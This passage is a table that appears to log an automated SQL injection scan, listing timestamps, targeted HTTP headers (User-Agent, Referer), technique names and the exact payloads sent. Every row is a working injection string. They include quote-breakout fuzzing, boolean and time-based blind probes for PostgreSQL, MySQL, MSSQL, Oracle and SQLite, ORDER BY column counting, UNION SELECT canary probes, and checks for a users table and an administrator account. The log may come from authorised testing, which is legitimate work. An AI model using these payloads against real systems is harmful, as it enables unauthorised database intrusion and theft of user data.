| 321 | `17:35:31` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_11',NULL-- -` |
| 322 | `17:35:32` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_11',NULL FROM DUAL--` |
| 323 | `17:35:32` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_11',NULL-- -` |
| 324 | `17:35:33` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_11'),NULL-- -` |
| 325 | `17:35:34` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_12'-- -` |
| 326 | `17:35:34` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_12' FROM DUAL--` |
| 327 | `17:35:35` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_12'-- -` |
| 328 | `17:35:36` | `User-Agent (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_12')-- -` |
| 329 | `17:35:37` | `Referer (header)` | Differential Probe | `' OR "/*"/*`*/[1]=(SELECT(CASE WHEN(1=1)THEN 1 ELSE 1/0 END))--` |
| 330 | `17:35:37` | `Referer (header)` | Error-based CAST | `-0+CAST((SELECT 1) AS INT)` |
| 331 | `17:35:38` | `Referer (header)` | Differential Probe | `' AND jsonb_typeof(data) IS NOT NULL AND '[0]'::vector <=> '[0]'::vector--` |
| 332 | `17:35:39` | `Referer (header)` | Syntax Breakout Fuzzing | `'` |
| 333 | `17:35:40` | `Referer (header)` | Syntax Breakout Fuzzing | `''` |
| 334 | `17:35:40` | `Referer (header)` | Syntax Breakout Fuzzing | `"` |
| 335 | `17:35:41` | `Referer (header)` | Syntax Breakout Fuzzing | `')` |
| 336 | `17:35:42` | `Referer (header)` | Syntax Breakout Fuzzing | `")` |
| 337 | `17:35:43` | `Referer (header)` | Syntax Breakout Fuzzing | `'--` |
| 338 | `17:35:44` | `Referer (header)` | Syntax Breakout Fuzzing | `';--` |
| 339 | `17:35:45` | `Referer (header)` | Boolean True Probe | `' AND '1'='1` |
| 340 | `17:35:45` | `Referer (header)` | Boolean False Probe | `' AND '1'='2` |
| 341 | `17:35:46` | `Referer (header)` | Boolean True Probe | `' AND 1=1--` |
| 342 | `17:35:47` | `Referer (header)` | Boolean False Probe | `' AND 1=2--` |
| 343 | `17:35:47` | `Referer (header)` | Differential Probe | `' AND (SELECT 'a' FROM users LIMIT 1)='a` |
| 344 | `17:35:48` | `Referer (header)` | Differential Probe | `' AND (SELECT 'a' FROM users LIMIT 1)='b` |
| 345 | `17:35:50` | `Referer (header)` | Differential Probe | `' AND (SELECT 'a' FROM users WHERE username='administrator')='a` |
| 346 | `17:35:51` | `Referer (header)` | Differential Probe | `' AND (SELECT 'a' FROM users WHERE username='nonexistent_sqli_test_user')='a` |
| 347 | `17:35:51` | `Referer (header)` | Boolean True Probe | `' AND (SELECT 1 FROM DUAL)=1 AND '1'='1` |
| 348 | `17:35:52` | `Referer (header)` | Boolean True Probe | `' AND (SELECT 1 FROM DUAL)=2 AND '1'='1` |
| 349 | `17:35:53` | `Referer (header)` | Boolean True Probe | `' AND (SELECT version()) IS NOT NULL AND '1'='1` |
| 350 | `17:35:54` | `Referer (header)` | Boolean True Probe | `' AND (SELECT version()) IS NULL AND '1'='1` |
| 351 | `17:35:54` | `Referer (header)` | Boolean True Probe | `' AND @@version=@@version AND '1'='1` |
| 352 | `17:35:55` | `Referer (header)` | Boolean True Probe | `' AND @@version='' AND '1'='1` |
| 353 | `17:35:56` | `Referer (header)` | Boolean True Probe | `' AND sqlite_version()=sqlite_version() AND '1'='1` |
| 354 | `17:35:56` | `Referer (header)` | Boolean True Probe | `' AND sqlite_version()='' AND '1'='1` |
| 355 | `17:35:57` | `Referer (header)` | Boolean True Probe | `' AND @@VERSION=@@VERSION AND '1'='1` |
| 356 | `17:35:58` | `Referer (header)` | Boolean True Probe | `' AND @@VERSION='' AND '1'='1` |
| 357 | `17:35:59` | `Referer (header)` | Time-based Blind | `'\|\|(SELECT pg_sleep(3))\|\|'` |
| 358 | `17:35:59` | `Referer (header)` | Time-based Blind | `' AND (SELECT 1 FROM (SELECT(SLEEP(3)))snt)-- -` |
| 359 | `17:36:01` | `Referer (header)` | Differential Probe | `'\|\|(SELECT dbms_pipe.receive_message(('RDS'),3) FROM DUAL)\|\|'` |
| 360 | `17:36:02` | `Referer (header)` | Time-based Blind | `'; WAITFOR DELAY '0:0:3'--` |
| 361 | `17:36:03` | `Referer (header)` | Time-based Blind | `' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2)))))-- -` |
| 362 | `17:36:04` | `Referer (header)` | Time-based Blind | `'; SELECT pg_sleep(3);--` |
| 363 | `17:36:05` | `Referer (header)` | Time-based Blind | `'; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))));--` |
| 364 | `17:36:06` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 1-- -` |
| 365 | `17:36:06` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 2-- -` |
| 366 | `17:36:07` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 3-- -` |
| 367 | `17:36:08` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 4-- -` |
| 368 | `17:36:09` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 5-- -` |
| 369 | `17:36:10` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 6-- -` |
| 370 | `17:36:11` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 7-- -` |
| 371 | `17:36:11` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 8-- -` |
| 372 | `17:36:12` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 9-- -` |
| 373 | `17:36:13` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 10-- -` |
| 374 | `17:36:14` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 11-- -` |
| 375 | `17:36:14` | `Referer (header)` | ORDER BY Column Count | `' ORDER BY 12-- -` |
| 376 | `17:36:21` | `Referer (header)` | UNION-based | `' UNION SELECT 'SENTINEL'\|\|'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 377 | `17:36:22` | `Referer (header)` | UNION-based | `' UNION SELECT 'SENTINEL'\|\|'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 378 | `17:36:23` | `Referer (header)` | UNION-based | `' UNION SELECT 'SENTINEL'+'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 379 | `17:36:36` | `Referer (header)` | UNION-based | `' UNION SELECT CONCAT('SENTINEL','_CANARY_01'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 380 | `17:36:49` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,'SENTINEL'\|\|'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 381 | `17:36:51` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,'SENTINEL'\|\|'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 382 | `17:37:04` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,'SENTINEL'+'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 383 | `17:37:11` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,CONCAT('SENTINEL','_CANARY_02'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 384 | `17:37:24` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,'SENTINEL'\|\|'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 385 | `17:37:31` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,'SENTINEL'\|\|'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 386 | `17:37:34` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,'SENTINEL'+'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 387 | `17:37:41` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,CONCAT('SENTINEL','_CANARY_03'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 388 | `17:37:55` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 389 | `17:38:10` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 390 | `17:38:25` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,'SENTINEL'+'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 391 | `17:38:32` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_04'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 392 | `17:38:36` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 393 | `17:38:39` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 394 | `17:38:54` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 395 | `17:39:09` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_05'),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 396 | `17:39:25` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 397 | `17:39:28` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 398 | `17:39:43` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 399 | `17:39:46` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_06'),NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 400 | `17:40:02` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_07',NULL,NULL,NULL,NULL,NULL-- -` |
| 401 | `17:40:18` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_07',NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 402 | `17:40:33` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_07',NULL,NULL,NULL,NULL,NULL-- -` |
| 403 | `17:40:36` | `Referer (header)` | UNION-based | `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_07'),NULL,NULL,NULL,NULL,NULL-- -` |
